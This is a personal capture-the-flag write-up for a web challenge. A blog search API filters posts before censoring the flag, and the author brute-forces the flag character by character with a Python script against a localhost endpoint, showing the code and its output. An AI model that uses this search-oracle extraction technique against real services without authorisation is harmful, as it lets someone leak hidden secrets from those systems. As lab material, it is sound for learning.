For this CTF, I tried to venture outside of my meta--I did solve some crypto challenges, but I also ended up completing my first rev challenge and also solved this web challenge. I found this the most interesting, so here's my writeup of how I solved it.

## Overview

In this challenge, we're sent to a blog-like webpage (not dissimilar to this website) that contains different posts. One of the posts contains the flag.

```js
const posts = [
    {
        id: 1,
        title: "Welcome to our blog!",
        content: "This is our first post. Welcome everyone!",
        author: "admin",
        date: "2025-01-15"
    },
    {
        id: 2,
        title: "Tech Tips",
        content: "Here are some useful technology tips for beginners. Always keep your software updated!",
        author: "Some guy out there",
        date: "2025-01-20"
    },
    {
        id: 3,
        title: "Not the flag?",
        content: `Well luckily the content of the flag is hidden so here it is: ${FLAG}`,
        author: "admin",
        date: "2025-05-13"
    },
    ...
];
```

However, any instance of the flag is replaced with `*`.

As a result, we want to figure out a way to bypass the censored flag.

## Search Requests

If we look carefully at the search request code, we can see that matching posts are first filtered, and then the flag is replaced with the asteriks.

```js
app.post('/api/search', (req, res) => {
    const { query } = req.body;
    
    if (!query || typeof query !== 'string' || query.length !== 3) {
        return res.status(400).json({ 
            error: 'Query must be 3 characters.',
        });
    }

    const matchingPosts = posts
        .filter(post => 
            post.title.includes(query) ||
            post.content.includes(query) ||
            post.author.includes(query)
        )
        .map(post => ({
            ...post,
            content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
    }));

    res.json({
        results: matchingPosts,
        count: matchingPosts.length,
        query: query
    });
});
```

As a result, even if we search for something that is censored, it will still show up hidden behind the censors. For example, searching for the first three characters of the flag in this CTF competition (i.e. "L3A", where the flag tag is "L3AK") gives us two blog posts, one of which is censored.

![search for L3A](/assets/flag-l3ak/l3ak-search.png)

Hence, we can bash through all possible characters, check if the post with the flag shows up in the found posts, and build the flag accordingly. The annoying thing is that the query must be 3 characters, but it isn't the end of the world.

## Scripting

The solution is rather straightforward.

```python
import requests
import string

URL = "http://localhost:3000/api/search"
LENGTH = 17
flag = "L3AK{"

def search_query(query):
    try:
        response = requests.post(URL, json={"query": query})
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Server returned status {response.status_code}: {response.text}")
    except Exception as e:
        print(f"Request failed: {e}")
    return None


def check_in_flag_post(substring):
    result = search_query(substring)
    if result and result.get("results"):
        for post in result["results"]:
            if post.get("title") == "Not the flag?":
                return True
    return False


print("--- EXTRACTING FLAG ---")
while len(flag) < LENGTH:
    print(f"\nCurrent flag: {flag} (length: {len(flag)} of {LENGTH})")

    test = flag[-2:]
    print(f"Testing {test} + ?")

    for char in string.printable:
        test_str = test + char
        if check_in_flag_post(test_str):
            print(f"Found valid char: {char}")
            flag += char
            break

print("\n--- FINAL RESULT ---")
print(f"Extracted flag: {flag}")
```

I'm using the library `requests` to send requests to the server, and `string` because I don't want to type out all of the possible characters.

`search_query` will send a POST request to the `/api/search` endpoint of the website and `check_in_flag_post` will check if the blog post "Not the flag?" shows up in the results. Then, since we know the flag starts with "L3AK{", we can constantly send the last 2 characters of the flag and some random character, which is what this block of code is for.

```python
    for char in string.printable:
        test_str = test + char
        if check_in_flag_post(test_str):
            print(f"Found valid char: {char}")
            flag += char
            break
```

Running the script, we get the following result.

```
--- EXTRACTING FLAG ---

Current flag: L3AK{ (length: 5 of 17)
Testing K{ + ?
Found valid char: t

Current flag: L3AK{t (length: 6 of 17)
Testing {t + ?
Found valid char: 3

...

Current flag: L3AK{t3mp_flag!! (length: 16 of 17)
Testing !! + ?
Found valid char: }

--- FINAL RESULT ---
Extracted flag: L3AK{t3mp_flag!!}
```
